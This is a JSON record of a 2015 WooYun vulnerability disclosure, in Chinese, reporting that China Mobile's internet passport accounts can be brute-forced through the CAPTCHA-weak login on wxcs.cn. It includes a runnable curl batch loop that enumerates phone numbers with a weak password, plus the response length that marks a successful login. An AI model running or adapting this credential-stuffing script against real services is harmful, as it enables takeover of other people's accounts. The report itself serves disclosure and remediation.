{"id": 36355, "wybug_id": "wooyun-2015-0102077", "wybug_title": "绕过变态图验对中国移动互联网通行证暴力破解撞库(2)", "wybug_corp": "中国移动", "wybug_author": "bl4de", "wybug_date": "2015-03-18 16:48", "wybug_open_date": "2015-05-07 10:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "低", "wybug_rank_0": "3", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向公众公开  简要描述： 见上一个漏洞描述http://www.wooyun.org/bugs/wooyun-2015-0101939　　移动互联网通行证可登录多个业务系统，是统一认证账户。通行证主站图验直接破解有难度，可从业务站进行破解。最近新上了好几个新业务，看看是否由此入手，从而可以暴力破解互联网通行证账号.于是在这些新开的业务中找到几处可用于撞库的地方 详细说明：  先从互联网通行证管理主站cmpassport.com提取可用的弱口令。从下面贴图中可以看出，检验弱口令在本地js中，直接用js检查流行的top500，找出适用的弱口令用作字典 \n\n   然后用这个弱口令，在此处批量登录http://www.wxcs.cn   漏洞证明：  \n\n返回包长253，即登录成功\n\n这个是密码错误其它的为账户未开通还是用脚本验证\n\n脚本内容为(curl需要支持ssl，可http://curl.haxx.se/download.html处下载)for /L %x in (6000,1,9999) do curl -k -x 127.0.0.1:8888 -A \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; Tablet PC 2.0)\" -b \"BROWSER_TAG=80C217168217F634C68E37FE262F852D1426644913763; WXCS_PORTAL_AREA=120000; backUrl=\"aHR0cDovL3RpYW5qaW4ud3hjcy5jbg==\"; JSESSIONID=80C217168217F634C68E37FE262F852D; WXCS_PORTAL_TPL=win8; WXCS_PORTAL_LAST_AREA=120000\" -H \"X-Requested-With: XMLHttpRequest\" -d \"loginID=要解的手机号前几位%x&m1m=弱口令&backUrl=aHR0cDovL3RpYW5qaW4ud3hjcy5jbg%3D%3D&fromReq=\" -e \"https://ac.wxcs.cn/user/toLogin?backUrl=aHR0cDovL3RpYW5qaW4ud3hjcy5jbg==\" \"https://ac.wxcs.cn/user/loginPost\"  -w 5   修复方案：  图验防护   版权声明：转载请注明来源 bl4de@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-03-23 10:40 厂商回复： CNVD确认所述情况，已转由CNCERT向中国移动通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}